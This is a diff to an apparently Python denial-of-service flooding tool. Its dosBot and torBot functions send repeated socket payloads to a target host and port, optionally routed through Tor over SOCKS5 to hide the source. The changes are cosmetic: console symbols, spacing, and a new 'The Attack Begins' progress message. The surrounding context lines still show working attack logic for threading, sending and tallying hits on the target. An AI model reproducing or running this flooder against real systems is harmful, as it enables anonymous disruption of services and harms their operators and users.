@@ -94,9 +94,9 @@ def dosBot(url,port,i,tunda,metode):
 		bps = humansize(sys.getsizeof(resdata*4))
 		sizeData = sys.getsizeof(resdata)
 		if bps == 0:
-			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending ➤ {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE}:{len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ⬆️ {humansize(size)} tx:{bps} B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
+			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ✓ {humansize(size)} tx:{bps} B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
 		else:
-			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending ➤ {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE}:{len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ⬆️ {humansize(size)} tx:{bps} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
+			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.WHITE}{url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ✓ {humansize(size)} tx:{bps} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
 		time.sleep(0.1)
 		sys.stdout.flush()
 		
@@ -111,7 +111,7 @@ def dosBot(url,port,i,tunda,metode):
 			sock.send(resdata)
 			sock.shutdown(1)
 			ts = time.time() - t0
-			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended!{color.WHITE}, Server Up"+"                       "*5)
+			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE}, Server Up"+"                       "*5)
 			working.append(i)
 			size = size + sizeData*4
 		except KeyboardInterrupt:
@@ -137,9 +137,9 @@ def torBot(url,port,i,torrip,torport,tunda,metode):
 		bps = sys.getsizeof(resdata*4)
 		sizeData = sys.getsizeof(createData(url,metode))
 		if bps == 0:
-			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending ➤ {color.PURPLE}Tor{color.GREEN} ➤{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE}:{len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ⬆️ {humansize(size)} tx:{humansize(bps)}   B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
+			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ✓ {humansize(size)} tx:{humansize(bps)}   B | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
 		else:
-			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending ➤ {color.PURPLE}Tor{color.GREEN} ➤{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE}:{len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ⬆️ {humansize(size)} tx:{humansize(bps)} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
+			print(f"{color.WHITE}[{color.GREEN}{anime}{color.WHITE}] {color.LIGHTGREEN}Sending --> {color.PURPLE}Tor{color.GREEN} -->{color.WHITE} {url}:{port} | {color.RED}Failed{color.WHITE} : {len(failed)} | {color.GREEN}Success{color.WHITE}:{len(working)} | ✓ {humansize(size)} tx:{humansize(bps)} | {str(timedelta(seconds=int(time.time() - start)))}",end="\r")
 		sys.stdout.flush()
 		time.sleep(0.1)
 		#sizeData = sys.getsizeof(createData(url,metode))
@@ -155,7 +155,7 @@ def torBot(url,port,i,torrip,torport,tunda,metode):
 			sock.send(resdata)
 			sock.shutdown(1)
 			ts = time.time() - t0
-			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended!{color.WHITE}, Server Up"+"                       "*5)
+			print(f"{color.WHITE}[{color.GREEN}+{color.WHITE}]{color.GREEN} Sended !{color.WHITE}, Server Up"+"                       "*5)
 			working.append(i)
 			size = size + sizeData*4
 			time.sleep(tunda)
@@ -218,21 +218,21 @@ if havetor == False:
 if tornet or "--onion" in sys.argv or "-o" in sys.argv:
 	toraddr, torport = "127.0.0.1", 9050
 	toraddr, torport= tornet.split(":")
-	print("[+] Target: "+str(target))
-	print("[+] Port: "+str(port))
-	print("[+] Method: "+str(method))
-	print("[+] Thread: "+str(thread))
-	print(f"[+] Tor: {toraddr}:{torport} (socks5)")
+	print("[+] Target : "+str(target))
+	print("[+] Port : "+str(port))
+	print("[+] Method : "+str(method))
+	print("[+] Thread : "+str(thread))
+	print(f"[+] Tor : {toraddr}:{torport} ( Socks5 )")
 	tidur = time.sleep
 	print("")
 	for i in range(5):
-		print("Starting •°°",end="\r")
-		tidur(0.1)
-		print("Starting °•°",end="\r")
-		tidur(0.1)
-		print("Starting °°•",end="\r")
-		tidur(0.1)
-		print("Starting °°°",end="\r")
+		print("The Attack Begins 25%",end="\r")
+		tidur(0.4)
+		print("The Attack Begins 50%",end="\r")
+		tidur(0.3)
+		print("The Attack Begins 75%",end="\r")
+		tidur(0.2)
+		print("The Attack Begins 100%",end="\r")
 		tidur(0.1)
 	try:
 		runTor(target,int(port),thread,toraddr,torport,sleep,method)
@@ -243,21 +243,21 @@ if tornet or "--onion" in sys.argv or "-o" in sys.argv:
 
 # START PROCESS, NORMAL MODE
 if tornet == None:
-	print("[+] Target: "+str(target))
-	print("[+] Port: "+str(port))
-	print("[+] Thread: "+str(thread))
-	print("[+] Method: "+str(method))
-	print(f"[+] Tor: Not Actived")
+	print("[+] Target : "+str(target))
+	print("[+] Port : "+str(port))
+	print("[+] Thread : "+str(thread))
+	print("[+] Method : "+str(method))
+	print(f"[+] Tor : Not Actived")
 	print("")
 	tidur = time.sleep
 	for i in range(5):
-		print("Starting •°°",end="\r")
-		tidur(0.1)
-		print("Starting °•°",end="\r")
-		tidur(0.1)
-		print("Starting °°•",end="\r")
-		tidur(0.1)
-		print("Starting °°°",end="\r")
+		print("The Attack Begins 25%",end="\r")
+		tidur(0.4)
+		print("The Attack Begins 50%",end="\r")
+		tidur(0.3)
+		print("The Attack Begins 75%",end="\r")
+		tidur(0.2)
+		print("The Attack Begins 100%",end="\r")
 		tidur(0.1)
 	try:
 		run(target,int(port),thread,sleep,method)
